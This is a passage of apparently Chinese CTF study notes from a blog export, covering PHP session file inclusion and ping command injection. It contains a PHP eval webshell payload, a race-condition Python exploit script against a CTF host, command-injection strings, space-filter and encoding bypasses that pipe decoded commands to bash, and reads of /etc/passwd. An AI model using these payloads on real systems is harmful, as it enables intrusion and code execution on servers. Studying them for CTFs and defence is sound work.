-<h3 id="销毁-session"><a href="#销毁-session" class="headerlink" title="销毁 session"></a>销毁 session</h3><p>如果您希望删除某些 session 数据，可以使用 unset() 或 session_destroy() 函数。</p>
-<p>unset() 函数用于释放指定的 session 变量：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_SESSION[&#x27;views&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    unset($_SESSION[&#x27;views&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>您也可以通过调用 session_destroy() 函数彻底销毁 session：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_destroy();</span><br><span class="line">?&gt;</span><br><span class="line">// session_destroy() 将重置 session，将失去所有已存储的 session 数据。</span><br></pre></td></tr></table></figure>
-
-<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>把一个可控字符串（php恶意代码）写入session文件，然后包含session文件</p>
-<h2 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h2><h3 id="提供对session赋值的功能"><a href="#提供对session赋值的功能" class="headerlink" title="提供对session赋值的功能"></a>提供对session赋值的功能</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_GET[&#x27;a&#x27;]))&#123;</span><br><span class="line">    $a=$_GET[&#x27;a&#x27;];</span><br><span class="line">    $_SESSION[&#x27;username&#x27;]=$a;    </span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">?&gt;</span><br><span class="line">//flag在根目录</span><br></pre></td></tr></table></figure>
-
-<p>上传一句话木马：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/?a=&lt;?php echo 345;eval($_POST[0]);?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>在cookie中可以看到PHPSESSID，因此可以知道保存payload的文件名</p>
-<p><img src="https://s2.loli.net/2023/11/18/e4y2pTXnSbBxqjF.png" alt="image-20231024193152377"></p>
-<p>尝试默认保存目录，包含session文件</p>
-<p><img src="https://s2.loli.net/2023/11/18/jkc9v2zCLIe6htB.png" alt="image-20231024193718849"></p>
-<p>使用蚁剑连接，获取flag</p>
-<p><img src="https://s2.loli.net/2023/11/18/ip6MrloTe8hgbkX.png" alt="image-20231024193804739"></p>
-<h3 id="没有提供赋值功能"><a href="#没有提供赋值功能" class="headerlink" title="没有提供赋值功能"></a>没有提供赋值功能</h3><h4 id="session-upload-progress写入"><a href="#session-upload-progress写入" class="headerlink" title="session.upload_progress写入"></a><code>session.upload_progress</code>写入</h4><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231024194627329.png" alt="image-20231024194627329"></p>
-<h5 id="php配置"><a href="#php配置" class="headerlink" title="php配置"></a>php配置</h5><p>用<code>phpinfo()</code>查看</p>
-<p><img src="https://s2.loli.net/2023/11/18/LkCjMpXBFSJRQtu.png" alt="image-20231024194828661"></p>
-<p><code>session.upload_progress.enabled</code>：该选项开启（On）时，PHP可以监测文件上传的进度，这是客户端可以发送POST到服务端开查看上传进度，此时<code>session.upload_progress</code>生效</p>
-<p><code>session.upload_progress.cleanup</code>：该选项默认开启，读取POST请求后会删除上传进度信息。这时需要采用<strong>条件竞争</strong>的方法注入木马</p>
-<p>在文件上传过程中，客户端POST一个 <code>session.upload_progress.name</code> 的值同名的变量时，会在 <code>$_SESSION </code>数组中添加一组数据，索引是 <code>session.upload_progress.prefix</code> 与 <code>session.upload_progress.name</code> 拼接在一起的值。因此可以通过POST以 <code>session.upload_progress.name</code> 的值作为变量名的数据，变量值就是 <code>payload</code></p>
-<p><code>session.use_strict_mode</code>：默认关闭，改选项开启时，PHP不接受未初始化的会话id（就不能自己命名PHPSESSID）</p>
-<p><img src="https://s2.loli.net/2023/11/18/caAXuwxWNplgkfI.png" alt="image-20231024195321050"></p>
-<h5 id="实例及详解（session-upload-progress-cleanup为Off）"><a href="#实例及详解（session-upload-progress-cleanup为Off）" class="headerlink" title="实例及详解（session.upload_progress.cleanup为Off）"></a>实例及详解（<code>session.upload_progress.cleanup</code>为<code>Off</code>）</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;http://b.y1ng.vip:2007/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--action的值为目标服务器地址 --&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; </span><br><span class="line">&lt;!-- name的值为phpinfo中参数session.upload_progress.name的值；value的值为payload--&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>打开后发现是一个上传界面，开启burp代理，然后任意上传一个文件，burp抓包并发送到repeater模块</p>
-<p><img src="https://s2.loli.net/2023/11/18/jaE6izYLsHlbKxW.png" alt="image-20231024200836460"></p>
-<p>利用hackbar包含session文件</p>
-<p><img src="https://s2.loli.net/2023/11/18/2dPbruMC1mJsSo3.png" alt="image-20231024200921497"></p>
-<p>做题时，payload可以为：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="number">123</span>;@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">0</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="实例及详解（session-upload-progress-cleanup为On）"><a href="#实例及详解（session-upload-progress-cleanup为On）" class="headerlink" title="实例及详解（session.upload_progress.cleanup为On）"></a>实例及详解（<code>session.upload_progress.cleanup</code>为<code>On</code>）</h5><p>[WMCTF 2020]Make PHP Great Again</p>
-<h6 id="解法一：python脚本包含session"><a href="#解法一：python脚本包含session" class="headerlink" title="解法一：python脚本包含session"></a>解法一：python脚本包含session</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;http://1a4c15ee-2120-40e0-8fd8-f5738de3977b.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">sessid = <span class="string">&#x27;feng&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            host,</span><br><span class="line">            data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php system(&#x27;cat flag.php&#x27;);echo md5(&#x27;1&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;a.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">READ</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(<span class="string">f&#x27;<span class="subst">&#123;host&#125;</span>?file=/tmp/sess_<span class="subst">&#123;sessid&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+++]retry&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line">    READ(session)</span><br></pre></td></tr></table></figure>
-
-<p>执行得flag</p>
-<p><img src="https://s2.loli.net/2023/11/18/z5tDdReJVqoXPwA.png" alt="image-20231030222311829"></p>
-<h6 id="解法二：html-爆破"><a href="#解法二：html-爆破" class="headerlink" title="解法二：html+爆破"></a>解法二：html+爆破</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#poc.php</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;http://1a4c15ee-2120-40e0-8fd8-f5738de3977b.node4.buuoj.cn:81/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--action的值为目标服务器地址 --&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?php system(&#x27;cat /flag.php&#x27;);?&gt;&quot; /&gt; </span><br><span class="line">&lt;!-- name的值为phpinfo中参数session.upload_progress.name的值；value的值为payload--&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="https://s2.loli.net/2023/11/18/ZB8pTUqw3y5LOA9.png" alt="image-20231030223039080"></p>
-<p><img src="https://s2.loli.net/2023/11/18/rYBoZJX4lDItuzi.png" alt="image-20231030223644568"></p>
-<p><img src="https://s2.loli.net/2023/11/18/GHhTy6a1iJbujU5.png" alt="image-20231030223554025"></p>
-]]></content>
-      <categories>
-        <category>文件包含</category>
-      </categories>
-      <tags>
-        <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Ping命令学习记录</title>
-    <url>/2024/03/09/Ping%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<h1 id="Ping命令"><a href="#Ping命令" class="headerlink" title="Ping命令"></a>Ping命令</h1><h2 id="题目样式"><a href="#题目样式" class="headerlink" title="题目样式"></a>题目样式</h2><p>看到ping或者ping命令却没有waf时就要想到命令注入。</p>
-<h2 id="具体注入方法"><a href="#具体注入方法" class="headerlink" title="具体注入方法"></a>具体注入方法</h2><p>看到ping命令就可以利用截断来执行新的命令。</p>
-<span id="more"></span>
-
-<p>首先测试所有的截断符号：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$</span><br><span class="line">;</span><br><span class="line">|</span><br><span class="line">-</span><br><span class="line">(</span><br><span class="line">)</span><br><span class="line">反引号</span><br><span class="line">||</span><br><span class="line">&amp;&amp;</span><br><span class="line">&amp;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure>
-
-<p><code>%0a</code>可以当作空格来用；<br>利用截断符号配合普通命令简单问题基本就出来；<br>例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=127.0.0.1;cat /home/flag.txt</span><br></pre></td></tr></table></figure>
-
-<p>简单的flag就出来了，也可以配合其他的进行。</p>
-<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><h3 id="分号用法"><a href="#分号用法" class="headerlink" title=";分号用法"></a><code>;</code>分号用法</h3><p>方式：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 ; command2</span><br></pre></td></tr></table></figure>
-
-<p>用<code>;</code>号隔开每个命令， 每个命令按照从左到右的<strong>顺序</strong>执行， 彼此之间不关心是否失败， 所有命令都会执行。</p>
-<h3 id="管道符用法"><a href="#管道符用法" class="headerlink" title="| 管道符用法"></a><code>| </code>管道符用法</h3><p>上一条命令的输出，作为下一条命令参数。</p>
-<p>CTF里面：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1 | ls</span><br></pre></td></tr></table></figure>
-
-<p>只执行ls不执行前面的<br>方式：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 | command</span><br></pre></td></tr></table></figure>
-
-<p>Linux所提供的管道符“|”将两个命令隔开，管道符左边命令的输出就会作为管道符右边命令的输入。<br>连续使用管道意味着第一个命令的输出会作为第二个命令的输入，第二个命令的输出又会作为第三个命令的输入，依此类推。</p>
-<p>利用一个管道：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -qa|grep licq</span><br></pre></td></tr></table></figure>
-
-<p>这条命令使用一个管道符“|”建立了一个管道。管道将<code>rpm -qa</code>命令的输出（包括系统中所有安装的RPM包）作为<code>grep</code>命令的输入，从而列出带有<code>licq</code>字符的RPM包来。q表示查询query，a表示all。</p>
-<p>利用多个管道：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | grep /bin/bash | wc -l</span><br></pre></td></tr></table></figure>
-
-<p>这条命令使用了两个管道，利用第一个管道将cat命令（显示passwd文件的内容）的输出送给grep命令，grep命令找出含有“&#x2F;bin &#x2F;bash”的所有行；第二个管道将grep的输出送给wc命令，wc命令统计出输入中的行数。这个命令的功能在于找出系统中有多少个用户使用bash。</p>
-<h3 id="符号用法"><a href="#符号用法" class="headerlink" title="&amp;符号用法"></a><code>&amp;</code>符号用法</h3><p>ctf中用法 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1 &amp; ls</span><br></pre></td></tr></table></figure>
-
-<p>先执行<code>ls</code>后执行<code>ping</code></p>
-<p><code>&amp;</code>放在启动参数后面表示设置此进程为后台进程</p>
-<p>方式：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 &amp; command2</span><br></pre></td></tr></table></figure>
-
-<p>默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作。<br>对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个<code>&amp;</code>实现这个目的。</p>
-<h3 id="符号用法（与）"><a href="#符号用法（与）" class="headerlink" title="&amp;&amp;符号用法（与）"></a><code>&amp;&amp;</code>符号用法（与）</h3><p>ctf中用法 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1 &amp;&amp; ls</span><br></pre></td></tr></table></figure>
-
-<p><code>ping</code> 命令正确才执行 <code>ls</code> 要是 <code>ping 1 &amp;&amp; ls ls</code> 就不会执行</p>
-<p><code>shell</code> 在执行某个命令的时候，会返回一个返回值，该返回值保存在 <code>shell</code> 变量 <code>$?</code> 中。</p>
-<p>当 <code>$? == 0</code> 时，表示执行成功；<br>当 <code>$? == 1</code> 时（非0的数，返回值在0-255间），表示执行失败。</p>
-<p>有时候，下一条命令依赖前一条命令是否执行成功。</p>
-<p>如：在成功地执行一条命令之后再执行另一条命令，或者在一条命令执行失败后再执行另一条命令等。</p>
-<p>shell 提供了 <code>&amp;&amp;</code> 和 <code>||</code> 来实现命令执行控制的功能，shell 将根据 <code>&amp;&amp;</code> 或 <code>||</code> 前面命令的返回值来控制其后面命令的执行。</p>
-<p>语法格式如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 &amp;&amp; command2 [&amp;&amp; command3 …]</span><br></pre></td></tr></table></figure>
-
-<p>命令之间使用 &amp;&amp; 连接，实现逻辑与的功能。</p>
-<p>只有在 &amp;&amp; 左边的命令返回真（命令返回值 <code>$? == 0</code>），<code>&amp;&amp;</code> 右边的命令才会被执行。<br>只要有一个命令返回假（命令返回值 <code>$? == 1</code>），后面的命令就不会被执行。</p>
-<h3 id="符号用法（或）"><a href="#符号用法（或）" class="headerlink" title="||符号用法（或）"></a><code>||</code>符号用法（或）</h3><p>和<code>&amp;&amp;</code>相反，左边为假才执行命令二</p>
-<p>语法格式如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 || command2 [|| command3 …]</span><br></pre></td></tr></table></figure>
-
-
-<p>命令之间使用 || 连接，实现逻辑或的功能。</p>
-<p>只有在 || 左边的命令返回假（命令返回值 $? &#x3D;&#x3D; 1），|| 右边的命令才会被执行。这和 c 语言中的逻辑或语法功能相同，即实现短路逻辑或操作。</p>
-<p>只要有一个命令返回真（命令返回值 $? &#x3D;&#x3D; 0），后面的命令就不会被执行。直到返回真的地方停止执行。</p>
-<p>举例，ping命令判断存活主机，注意 &amp;&gt;要连起来写</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping -c 1 -w 1 192.168.1.1 &amp;&gt; /dev/null &amp;&amp; result=0 ||result=1    if [ &quot;$result&quot; == 0 ];then    echo &quot;192.168.1.1 is UP!&quot;     else    echo &quot;192.168.2.1 is DOWN!&quot;   fi</span><br></pre></td></tr></table></figure>
-
-<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p>linux下绕过空格</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //$1改成$加其他数字貌似都行</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能</span><br><span class="line">%20 </span><br><span class="line">%09 </span><br></pre></td></tr></table></figure>
-
-<p>例如</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br></pre></td></tr></table></figure>
-
-<p>\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kg=$&#x27;\x20flag.txt&#x27;&amp;&amp;cat$kg</span><br></pre></td></tr></table></figure>
-
-<h3 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h3><p><code>???</code>在linux里面可以进行代替字母</p>
-<p>比如</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/???/c?t flag.txt</span><br></pre></td></tr></table></figure>
-
-<p><code>*</code>在linux里面可以进行模糊匹配</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat flag.* *</span><br></pre></td></tr></table></figure>
-
-<p>进行模糊匹配php</p>
-<h3 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤<code>cat</code></h3><p><code>cat</code>：由第一行开始显示内容，并将所有内容输出</p>
-<p><code>tac</code>：从最后一行倒序显示内容，并将所有内容输出</p>
-<p><code>more</code>：根据窗口大小，一页一页的现实文件内容</p>
-<p><code>less</code>和<code>more</code>类似，但其优点可以往前翻页，而且进行可以搜索字符</p>
-<p><code>head</code>：只显示头几行</p>
-<p><code>tail</code>：只显示最后几行</p>
-<p><code>nl</code>：类似于cat -n，显示时输出行号</p>
-<p><code>tailf</code>：类似于tail -f</p>
-<p><code>sort%20/flag</code> 读文件</p>
-<p><code>dir</code> 来查看当前目录文件</p>
-<p>也可以<code>c\at</code></p>
-<h3 id="Linux花式读取文件内容"><a href="#Linux花式读取文件内容" class="headerlink" title="Linux花式读取文件内容"></a>Linux花式读取文件内容</h3><p>ps:目标是获取flag.txt的内容</p>
-<h4 id="static-sh读取文件"><a href="#static-sh读取文件" class="headerlink" title="static-sh读取文件"></a><code>static-sh</code>读取文件</h4><p><code>static-sh ./flag.txt</code>等同于<code>/???/??????-?? ./flag.txt</code></p>
-<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">static-sh ./flag.txt</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">./flag.<span class="symbol">txt:</span> line <span class="number">1</span>: flag&#123;this_is_a_test&#125;: <span class="keyword">not</span> found</span><br><span class="line"><span class="comment"># 等同于</span></span><br><span class="line">/<span class="string">??</span><span class="string">?/</span><span class="string">??</span><span class="string">??</span><span class="string">??</span>-<span class="string">??</span> ./flag.txt</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">./flag.<span class="symbol">txt:</span> line <span class="number">1</span>: flag&#123;this_is_a_test&#125;: <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure>
-
-<h4 id="paste读取文件"><a href="#paste读取文件" class="headerlink" title="paste读取文件"></a><code>paste</code>读取文件</h4><p><code>paste ./flag.txt /etc/passwd</code></p>
-<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">paste ./flag.txt /etc/passwd</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">flag&#123;this_is_a_test&#125;    <span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line">        <span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">        <span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">        <span class="symbol">sys:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:sys</span><span class="symbol">:/dev</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">        <span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:sync</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sync</span></span><br><span class="line">/<span class="regexp">/省略</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="diff读取文件"><a href="#diff读取文件" class="headerlink" title="diff读取文件"></a><code>diff</code>读取文件</h4><p><code>diff ./flag.txt /etc/passwd</code></p>
-<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">diff ./flag.txt /etc/passwd</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">1c1,<span class="number">45</span></span><br><span class="line">&lt; flag&#123;this_is_a_test&#125;</span><br><span class="line">\ <span class="title class_">No</span> newline at <span class="keyword">end</span> of file</span><br><span class="line">---</span><br><span class="line">&gt; <span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line">&gt; <span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">&gt; <span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">&gt; <span class="symbol">sys:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:sys</span><span class="symbol">:/dev</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">&gt; <span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:sync</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sync</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="od读取文件"><a href="#od读取文件" class="headerlink" title="od读取文件"></a><code>od</code>读取文件</h4><p><code>od -a ./flag.txt</code></p>
-<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">od -<span class="selector-tag">a</span> ./flag<span class="selector-class">.txt</span></span><br><span class="line">#输出结果：</span><br><span class="line"><span class="number">0000000</span>   f   l   <span class="selector-tag">a</span>   g   &#123;   t   h   <span class="selector-tag">i</span>   s   _   <span class="selector-tag">i</span>   s   _   <span class="selector-tag">a</span>   _   t</span><br><span class="line"><span class="number">0000020</span>   e   s   t   &#125;</span><br><span class="line"><span class="number">0000024</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="bzmore读取文件"><a href="#bzmore读取文件" class="headerlink" title="bzmore读取文件"></a><code>bzmore</code>读取文件</h4><p><code>bzmore ./flag.txt</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bzmore ./flag.txt</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">------&gt; ./flag.txt &lt;------</span><br><span class="line">flag&#123;this_is_a_test&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="bzless读取文件"><a href="#bzless读取文件" class="headerlink" title="bzless读取文件"></a><code>bzless</code>读取文件</h4><p><code>bzless ./flag.txt</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> `bzless ./flag.txt`</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">------&gt; ./flag.txt &lt;------ flag&#123;this_is_a_test&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> YWJjZGU=|base64 -d </span><br><span class="line">    <span class="comment">//打印出来abcde</span></span><br><span class="line"><span class="keyword">echo</span> Y2F0IGZsYWcucGhw|base64 -d|bash </span><br><span class="line">    <span class="comment">//cat flag.php</span></span><br><span class="line"><span class="keyword">echo</span> Y2F0IGZsYWcucGhw|base64 -d|sh </span><br><span class="line">    <span class="comment">//cat flag.php</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="hex"><a href="#hex" class="headerlink" title="hex"></a>hex</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="number">63617420666</span>c61672e706870 | xxd -r -p|bash <span class="comment">//cat flag.php</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="unicode"><a href="#unicode" class="headerlink" title="unicode"></a>unicode</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$(printf “\<span class="number">154</span>\<span class="number">163</span>”) </span><br><span class="line">    <span class="comment">//ls</span></span><br><span class="line">$(printf “\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70”) </span><br><span class="line">    <span class="comment">//cat flag.php</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤;"></a>过滤<code>;</code></h3><h2 id="例题及详解"><a href="#例题及详解" class="headerlink" title="例题及详解"></a>例题及详解</h2><p>[GXYCTF2019]Ping Ping Ping</p>
-<p><img src="https://s2.loli.net/2023/11/20/mJixQ7jw4ukMNZn.png" alt="image-20231103224815525"></p>
-<p>打开靶机，发现提示用GET方法进行Ping命令注入</p>
-<p>构造<code>?ip=127.0.0.1;ls</code></p>
-<p><img src="https://s2.loli.net/2023/11/20/O9nWgscwGiC2Ldp.png" alt="image-20231103224922092"></p>
-<p>发现两个php文件</p>
-<p>构造<code>?ip=127.0.0.1;cat index.php</code>（一般题目不会直接让你出flag，估计里面是各种过滤）</p>
-<p><img src="https://s2.loli.net/2023/11/20/Z9PV3Ws8LJag6Kc.png" alt="image-20231103225231785"></p>
-<p>发现空格被过滤，用<code>$IFS$1</code>绕过，但是无回显</p>
-<p><img src="https://s2.loli.net/2023/11/20/uHCFWkieYcdxE4r.png" alt="image-20231103225717344"></p>
-<p>总结：过滤的特殊字符：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp; / ？ * &lt; x&#123;00&#125;-\x&#123;1f&#125; &#x27; &quot; \ () [] &#123;&#125;  空格</span><br><span class="line">&quot;xxxfxxxlxxxaxxxgxxx&quot; &quot; &quot; &quot;bash&quot; </span><br></pre></td></tr></table></figure>
-
-<p>flag的贪婪匹配，匹配一个字符串中，是否按顺序出现过flag四个字母</p>
